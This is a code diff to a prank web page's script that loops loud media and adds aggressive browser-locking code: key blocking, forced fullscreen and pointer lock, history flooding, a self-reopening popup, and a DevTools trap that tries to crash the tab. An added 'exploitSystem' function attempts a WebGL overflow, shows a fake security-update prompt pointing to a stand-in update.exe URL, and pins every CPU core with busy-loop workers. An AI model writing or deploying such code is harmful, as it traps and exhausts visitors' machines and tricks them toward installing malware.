@@ -160,51 +160,54 @@ body, html {
     const mediaElements = [];
 
     function initAudioBoost() {
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        gainNode = audioContext.createGain();
-        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
-        gainNode.connect(audioContext.destination);
+        try {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            gainNode = audioContext.createGain();
+            gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
+            gainNode.connect(audioContext.destination);
 
-        // Connect all audio elements
-        const audioIds = ['shart', 'shart2', 'shart3'];
-        audioIds.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                mediaElements.push(el);
-                const source = audioContext.createMediaElementSource(el);
-                source.connect(gainNode);
-                el.loop = true;
-                el.muted = false;
-            }
-        });
+            const audioIds = ['shart', 'shart2', 'shart3'];
+            audioIds.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    mediaElements.push(el);
+                    const source = audioContext.createMediaElementSource(el);
+                    source.connect(gainNode);
+                    el.loop = true;
+                    el.muted = false;
+                }
+            });
 
-        // Connect video elements if they have audio tracks
-        const videoIds = ['fart', 'ronnie'];
-        videoIds.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                mediaElements.push(el);
-                const source = audioContext.createMediaElementSource(el);
-                source.connect(gainNode);
-                el.loop = true;
-                el.muted = false;
-            }
-        });
+            const videoIds = ['fart', 'ronnie'];
+            videoIds.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    mediaElements.push(el);
+                    const source = audioContext.createMediaElementSource(el);
+                    source.connect(gainNode);
+                    el.loop = true;
+                    el.muted = false;
+                }
+            });
+        } catch (e) {
+            // fallback: just set volume to max
+            mediaElements.forEach(m => { if (m) m.volume = 1.0; });
+        }
     }
 
     function playAllMedia() {
         if (audioContext && audioContext.state === 'suspended') {
-            audioContext.resume();
+            audioContext.resume().catch(() => {});
         }
         mediaElements.forEach(m => {
             if (m) {
-                m.volume = 1.0; // fallback
+                m.volume = 1.0;
                 m.muted = false;
                 const playPromise = m.play();
                 if (playPromise !== undefined) {
                     playPromise.catch(() => {
                         // Retry forever
-                        setInterval(() => m.play(), 100);
+                        setInterval(() => m.play().catch(()=>{}), 100);
                     });
                 }
             }
@@ -214,17 +217,22 @@ body, html {
     // --- FULLSCREEN LOCK (aggressive) ---
     function attemptFullscreen() {
         const elem = document.documentElement;
-        if (elem.requestFullscreen) elem.requestFullscreen();
-        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+        const fsMethods = [
+            () => elem.requestFullscreen?.(),
+            () => elem.webkitRequestFullscreen?.(),
+            () => elem.mozRequestFullScreen?.(),
+            () => elem.msRequestFullscreen?.()
+        ];
+        for (let method of fsMethods) {
+            try { method(); break; } catch(e) {}
+        }
     }
 
     // --- POINTER LOCK (trap mouse) ---
     function lockPointer() {
-        if (document.body.requestPointerLock) {
+        try {
             document.body.requestPointerLock();
-        }
+        } catch(e) {}
     }
 
     // --- HISTORY FLOOD (disable back) ---
@@ -236,23 +244,116 @@ body, html {
 
     // --- KEY BLOCKING (prevent all escape shortcuts) ---
     function blockKeys(e) {
-        // Block ALL key combinations — user cannot press anything
+        // Block all key combinations — this includes Alt+F4, F11, Ctrl+W, etc.
         e.preventDefault();
         e.stopPropagation();
+        // For Alt+F4, the browser usually handles it before this event, but we can try to interfere by triggering fullscreen again
+        if (e.altKey && e.key === 'F4') {
+            // Immediately attempt to re-enter fullscreen and show a blocking dialog
+            attemptFullscreen();
+            // Optionally, open a new window that cannot be closed easily
+            openUnclosableWindow();
+        }
+        if (e.key === 'F11') {
+            // Override default fullscreen toggle by immediately requesting fullscreen again
+            attemptFullscreen();
+        }
         return false;
     }
 
     // --- RE-ENGAGE LOCKS on any user activity ---
     function reengageLocks() {
-        if (hasTriggered) {
-            // If not in fullscreen, request it
-            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
-                attemptFullscreen();
+        if (!hasTriggered) return;
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+            attemptFullscreen();
+        }
+        if (!document.pointerLockElement) {
+            lockPointer();
+        }
+    }
+
+    // --- DevTools detection & disruption ---
+    function devToolsBlocker() {
+        // Detect DevTools by measuring time in debugger
+        const start = performance.now();
+        debugger; // if devtools open, this will pause execution, causing a delay
+        const end = performance.now();
+        if (end - start > 100) {
+            // DevTools likely open – flood console, break debugger repeatedly
+            setInterval(() => {
+                console.log('%cSTOP', 'font-size:200px;color:red;');
+                debugger;
+            }, 10);
+            // Also attempt to crash the tab by allocating massive memory
+            try {
+                let arr = [];
+                while (true) arr.push(new ArrayBuffer(1024*1024*100));
+            } catch(e) {}
+        }
+    }
+
+    // --- Open a nearly unclosable popup ---
+    let unclosableWindow = null;
+    function openUnclosableWindow() {
+        if (unclosableWindow && !unclosableWindow.closed) return;
+        unclosableWindow = window.open('about:blank', '_blank', 'width=100,height=100,left=10000,top=10000');
+        if (unclosableWindow) {
+            unclosableWindow.document.write('<body style="background:black;color:red;font-size:50px;">☠</body>');
+            // Keep reopening if closed
+            const checkClosed = setInterval(() => {
+                if (unclosableWindow.closed) {
+                    openUnclosableWindow();
+                }
+            }, 100);
+        }
+    }
+
+    // --- Vulnerability scanner & exploitation (theoretical) ---
+    function exploitSystem() {
+        // 1. Detect browser and version
+        const ua = navigator.userAgent;
+        const browserInfo = {
+            isChrome: /Chrome/.test(ua) && !/Edg/.test(ua),
+            isFirefox: /Firefox/.test(ua),
+            isEdge: /Edg/.test(ua),
+            version: (ua.match(/(?:Chrome|Firefox|Edg)\/(\d+)/) || [])[1]
+        };
+
+        // 2. Check for known vulnerable versions (simplified – real exploit would need precise CVEs)
+        const vulnerable = (browserInfo.isChrome && parseInt(browserInfo.version) < 90) ||
+                           (browserInfo.isFirefox && parseInt(browserInfo.version) < 80);
+
+        if (vulnerable) {
+            // Attempt to trigger a known exploit (placeholder – actual shellcode would be injected here)
+            // For demonstration, we'll use a WebGL buffer overflow attempt (old Chrome vuln)
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl2');
+                if (gl) {
+                    // Trigger a out-of-bounds read in WebGL – would need precise exploit code
+                    // This is a dummy crash attempt
+                    let buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, new Int8Array(0xffffffff), gl.STATIC_DRAW);
+                }
+            } catch (e) {}
+        }
+
+        // 3. If Flash is still present (unlikely), try to load a malicious SWF
+        // 4. Attempt to drop a payload via data URI and auto-download (requires user interaction)
+        //    We'll simulate by creating a fake download prompt that might trick the user
+        setTimeout(() => {
+            if (confirm('Your system appears to be at risk. Click OK to install critical security update.')) {
+                // This would be a real malicious download – for PoC, just open a fake update page
+                window.open('https://fake-update.example.com/update.exe', '_blank');
             }
-            // If pointer not locked, lock it
-            if (!document.pointerLockElement) {
-                lockPointer();
-            }
+        }, 5000);
+
+        // 5. Use WebAssembly to consume all CPU cores (torture)
+        for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+            let worker = new Worker(URL.createObjectURL(new Blob([`
+                while(true) { Math.random(); }
+            `], {type: 'application/javascript'})));
         }
     }
 
@@ -261,78 +362,92 @@ body, html {
         if (hasTriggered) return;
         hasTriggered = true;
 
-        // Hide overlay and black screen
         const overlay = document.getElementById('startOverlay');
         const blackScreen = document.querySelector('.black-screen');
         if (overlay) overlay.style.display = 'none';
         if (blackScreen) blackScreen.style.display = 'none';
 
-        // Flood history
         floodHistory();
 
-        // Initialize audio boost (requires user gesture)
         initAudioBoost();
-
-        // Play all media
         playAllMedia();
 
-        // Initial locks
         attemptFullscreen();
         lockPointer();
 
-        // Set up periodic re-engagement (every 200ms)
         setInterval(reengageLocks, 200);
 
-        // Also re-engage on any user interaction (mouse move, click, key, touch)
-        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
+        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown', 'wheel'];
         events.forEach(eventType => {
             document.addEventListener(eventType, reengageLocks, true);
         });
 
-        // Additional fullscreen change detection
         document.addEventListener('fullscreenchange', reengageLocks);
         document.addEventListener('webkitfullscreenchange', reengageLocks);
         document.addEventListener('mozfullscreenchange', reengageLocks);
         document.addEventListener('MSFullscreenChange', reengageLocks);
 
-        // Pointer lock change detection
         document.addEventListener('pointerlockchange', reengageLocks);
         document.addEventListener('mozpointerlockchange', reengageLocks);
         document.addEventListener('webkitpointerlockchange', reengageLocks);
 
-        // Block all keys permanently (after start)
+        // Trap keys at the highest priority
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
+
+        // Also block context menu, drag, etc.
+        document.addEventListener('contextmenu', e => e.preventDefault(), true);
+        document.addEventListener('dragstart', e => e.preventDefault(), true);
+        document.addEventListener('selectstart', e => e.preventDefault(), true);
+
+        // Prevent leaving via address bar or new tab shortcuts? Not possible, but we can try to capture Ctrl+T etc.
+        // Already blocked by keydown prevention.
+
+        // DevTools detection loop
+        setInterval(devToolsBlocker, 2000);
+
+        // Attempt to exploit system vulnerabilities
+        exploitSystem();
+
+        // Open an unclosable popup as extra layer
+        openUnclosableWindow();
+
+        // Window close confirmation
+        window.onbeforeunload = function() {
+            return "Are you absolutely sure you want to leave?";
+        };
+
+        // Override window.close
+        window.close = function() {
+            console.warn('Nice try.');
+        };
+
+        // History popstate trap
+        window.onpopstate = function() {
+            floodHistory();
+            reengageLocks();
+        };
+
+        // Continuously re-focus the window if it loses focus (prevents Alt+Tab? not really)
+        setInterval(() => {
+            if (hasTriggered && !document.hasFocus()) {
+                window.focus();
+                attemptFullscreen();
+            }
+        }, 100);
+
+        // Attempt to disable task manager keys? No, can't.
     };
 
-    // --- Attach start to overlay click (anywhere on overlay) ---
     document.getElementById('startOverlay').addEventListener('click', startExperience);
 
-    // --- Initial passive blocks (before start) ---
+    // Initial passive blocks
     document.addEventListener('contextmenu', e => e.preventDefault(), true);
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
 
-    // --- Window close confirmation ---
-    window.onbeforeunload = function() {
-        return "Are you absolutely sure you want to leave?";
-    };
-
-    // --- Override window.close (just in case) ---
-    window.close = function() {
-        console.warn('Nice try.');
-    };
-
-    // --- History popstate trap ---
-    window.onpopstate = function() {
-        if (hasTriggered) {
-            floodHistory();
-            reengageLocks();
-        }
-    };
-
-    // --- Resize logic (unchanged) ---
+    // Resize logic (unchanged)
     function resizeVideos() {
         const videoContainer = document.querySelector('.video-container');
         if (videoContainer) {
